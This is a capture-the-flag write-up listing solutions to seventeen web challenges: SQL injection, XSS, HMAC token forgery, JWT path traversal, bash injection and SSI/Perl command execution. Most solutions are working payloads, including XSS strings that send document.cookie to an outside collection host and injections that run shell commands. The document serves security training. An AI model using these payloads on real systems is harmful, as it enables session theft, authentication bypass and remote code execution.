# 1. sqli
http://188.166.248.215/

<details>
<summary>Solution</summary>
<code>0||1</code>
</details>

# 2. sqli
http://188.166.248.215/ce4dd79d-971b-40d3-a4e6-2041da6bcc64/

<details>
<summary>Solution</summary>
<code>'or'1</code>
</details>

# 3. sqli
http://188.166.248.215/85998adb-2109-45d2-aec9-6e9d995e6d47/

<details>
<summary>Solution</summary>

<code>'||1-- </code>

</details>

# 4. sqli
http://188.166.248.215/f3af878d-d7cd-47c0-b98e-074cf82d30d6/

<details>
<summary>Solution</summary>
<code>0-- '||1-- "||1-- </code>
</details>

# 5. xss
http://139.59.127.138/8eb7a8a1-2e0d-4ff7-a91b-8686ff229c28/

<details>
<summary>Solution</summary>

```
<img src=x onerror='src="http://requestb.in/1bikbhd1?x="+encodeURIComponent(document.cookie)'>
```

</details>



# 6. sqli
http://139.59.127.139/dbd41354-9645-4e87-bbb8-27f5db622a67/

<details>
<summary>Solution</summary>

username: `\`  
password: `||1-- `

</details>


# 7. xss
http://139.59.127.142/39b21eea-6168-431b-81b5-23252749917e/

<details>
<summary>Solution</summary>
<p>

js:
`');}location='http://requestb.in/1bikbhd1?x='+encodeURIComponent(document.cookie);{{'*/'/*`

url:
http://139.59.127.142/39b21eea-6168-431b-81b5-23252749917e/?js=')%3B%7Dlocation%3D'http%3A%2F%2Frequestb.in%2F1bikbhd1%3Fx%3D'%2BencodeURIComponent(document.cookie)%3B%7B%7B'*%2F'%2F*

</p>
</details>

# 8. xss
http://139.59.127.141/8e11d478-be5d-4f05-a27b-f3bff7b84168/

<details>
<summary>Hint</summary>
<p>

`?url` query parameter is vulnerable to xss. CSP rules are:  
`Content-Security-Policy:default-src 'none'; script-src 'nonce-disabled';`

</p>
</details>

<details>
<summary>Solution</summary>
<p>

url param:

```
pwn"><script nonce="disabled">location="http://requestb.in/1bikbhd1?y="+encodeURIComponent(document.cookie)</script><p x="
```

http://139.59.127.141/8e11d478-be5d-4f05-a27b-f3bff7b84168/?url=pwn%22%3E%3Cscript%20nonce%3D%22disabled%22%3Elocation%3D%22http%3A%2F%2Frequestb.in%2F1bikbhd1%3Fy%3D%22%2BencodeURIComponent(document.cookie)%3C%2Fscript%3E%3Cp%20x%3D%22

</p>
</details>

# 9. sqli (triple short)
http://139.59.127.144/d25d0cb4-90c3-465d-8733-b50229371377/

<details>
<summary>Solution</summary>
<p>

```
"="'='
```

</p>
</details>


# 10. sqli (12 random short)
http://139.59.127.144/9fc91798-4c0f-4e23-ab10-32e03e77ac95/

<details>
<summary>Solution</summary>
<p>

`5=6=0='&&0 union select char(115,117,99,99,101,115,115)from dual where 1||6='||5="&&0 union select char(115,117,99,99,101,115,115) from dual where 1||5="&&0 union select char(115,117,99,99,101,115,115) from dual where 1||8`

`5=6=0='&&0 union select char(115,117,99,99,101,115,115)from dual where 1||'||"&&0 union select char(115,117,99,99,101,115,115) from dual where 1||"&&0 union select char(115,117,99,99,101,115,115) from dual where 1||8`

`0='&&0 union select char(0x73756363,6648691)from dual where 1||'"&&0 union select char(0x73756363,6648691)from dual where 1||"&&0 union select char(0x73756363,6648691)from dual where 1||0`

`'union select char(0x73756363,6648691)from dual where!'"union select char(0x73756363,6648691)from dual where 1||"=3 union select char(0x73756363,6648691)from dual where 1||0`

`'union select char(0x73756363,6648691)-- '"union select char(0x73756363,6648691)-- "=3 union select char(0x73756363,6648691)-- `

`'union select char(0x73756363,6648691)-- '"union select'success'-- "=3 union select'success'-- `

`'union select char(0x73756363,6648691)#'"union select'success'#"=3 union select'success'#`

`5=6 union select char(0x73756363,6648691)-- '=7 union select'success'-- "=7 union select'success'-- `

`0=3 union select char(0x73756363,6648691)-- 'union select'success'-- "union select'success'-- `

`0=3 union select char(0x73756363,6648691)#'union select'success'#"union select'success'#`

`@ union select char(0x73756363,6648691)#'union select'success'#"union select'success'#`

`@/*'/*"/**/union select'success'#`

```
@#'#"
union select'success'#
```

</p>
</details>

# 11. ruby hmac token 1
http://139.59.127.145/db55fc7a-c615-449a-b86e-bde4df2ed70c/

<details>
<summary>Hint</summary>
<p>

There is source leak by forcing some ruby error, for example utf8 decoding error. We need to sign a malformed string, but that's not a problem.

http://139.59.127.145/db55fc7a-c615-449a-b86e-bde4df2ed70c/?data=aaaaaaaaa%FFb%20%20%20%20%20%20%20%20%20GUEST%20%20%20%20%20&hmac=ca9a9653f330c29dc8f797c08d6f23a16e17c2132e993b7981a1ad330723b655

```
  end

  generated_hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('sha256'), KEY, params["data"])
  unless params["hmac"] == generated_hmac
    return "go away hacker"
  end

  @first_name, @last_name, @role = params["data"].scan(/.{10}/).map(&:rstrip)

  if @role == "ADMIN"
    content_type :txt
    return File.read("#{__dir__}/../next_challenge_info.txt")
  else
    @title = "User Info"
    erb :index
```

</p>
</details>

<details>
<summary>Solution</summary>
<p>

Post data:  
```
first_name[]=1&first_name[]=2&first_name[]=3&first_name[]=444ADMIN++++++++++++++&first_name[]=5&first_name[]=6&first_name[]=7&first_name[]=8&first_name[]=9&first_name[]=0&last_name=ADMIN
```

</p>
</details>

# 12. ruby hmac token 2
http://139.59.127.146/ffd88992-6cc1-4733-bcb5-39dd5b1603a8/

<details>
<summary>Hint</summary>
<p>
This time there is no source, previous exploit doesn't work. This time they capitalized all the input.
</p>
</details>

<details>
<summary>Solution</summary>
<p>

Assume they cut the length before capitalizing and pad afterwards. Unicode anyone? There are codepoints that expand to
more codepoints when uppercased.

ftp://ftp.unicode.org/Public/UCD/latest/ucd/SpecialCasing.txt

```
first_name=aa%1F%B2%E1%BE%B7%E1%BE%B7%E1%BE%B7%E1%BE%B7%E1%BE%B7&last_name=admin+++++
```

</p>
</details>

# 13. jwt bypass
http://139.59.112.116/dddace4a-d619-4204-bb15-df6c0a24d6de/

<details>
<summary>Hint</summary>
<p>
They use this lib: https://github.com/jwt/ruby-jwt
</p>
</details>

<details>
<summary>Solution</summary>
<p>

kid was a local file

```
var kid = "../../../etc/magic";
var alg = "HS256";
var hdr = $@"{{""typ"":""JWT"",""alg"":""{alg}"",""kid"":""{kid}""}}";
var body = $@"{{""user"":""admin""}}";
```

```eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9tYWdpYyJ9.eyJ1c2VyIjoiYWRtaW4ifQ.KHvUjYMwH49GkMBB1FyyHJjX8J1kt79VAYadOpLDlMM```

</p>
</details>

# 14. sqli and php password check
http://139.59.127.147/e08720e1-df29-46cb-b1c8-83a32e9083df/

<details>
<summary>Solution</summary>
<p>

```
sqli
database leak with usernames and password hashes
crackstation: ripemd160

sql = "' UNION SELECT * FROM (SELECT '{}') c LEFT JOIN (SELECT '{}') a ON 1 LEFT JOIN (SELECT 0) b on 1 #".format(username, ripemd160(password).hex())
print(make_query(sql, password))
```

</p>
</details>

# 15. bash injection
http://139.59.127.148/ed932765-1a3a-467a-be5b-e11dc1fc542d/

<details>
<summary>Solution</summary>
<p>

```$( pwd | cut -c -9 )$( ls -S -r .. )```

</p>
</details>

# 16. captcha madness with no repeating chars
http://188.166.183.58/96e5c0bd-7f33-4188-94f0-89b3094bd6af/

<details>
<summary>Authors solution</summary>
<p>
http://139.59.127.149/e3cb1461-411d-4281-9c62-80b3c5e83cc9/captcha.php?id=q%27+unioN%0AselEct%0BmId(@fLag%0CFrOM%0D5)%23
</p>
</details>


# 17. echo service
http://139.59.127.150/1d0f2acf-a96b-4e9c-a70a-92ba42f70bc2/

<details>
<summary>Hint</summary>
<p>
By sending an invalid requests it replies with an error page redirecting to `/index.shtml`. What is `shtml`?

With some investigation we found that the service is in Perl: `index.pl`.
Somehow we found out there is a `/next_challenge` file on the filesystem. Don't remember how.

</p>
</details>

<details>
<summary>Solution</summary>
<p>

```
<!--#set var="PERL5OPT" value="-d" --><!--#set var="PERL5DB" value="BEGIN { require 'perl5db.pl' } END { print `cat /ne*` }" --><!--#include virtual="index.pl" onerror="index.pl"-->
```

http://139.59.127.150/1d0f2acf-a96b-4e9c-a70a-92ba42f70bc2/?name=%3C!--%23set%20var=%22PERL5OPT%22%20value=%22-d%22%20--%3E%3C!--%23set%20var=%22PERL5DB%22%20value=%22BEGIN%20{%20require%20%27perl5db.pl%27%20}%20END%20{%20print%20`cat%20/ne*`%20}%22%20--%3E%3C!--%23include%20virtual=%22index.pl%22%20onerror=%22index.pl%22--%3E

</p>
</details>
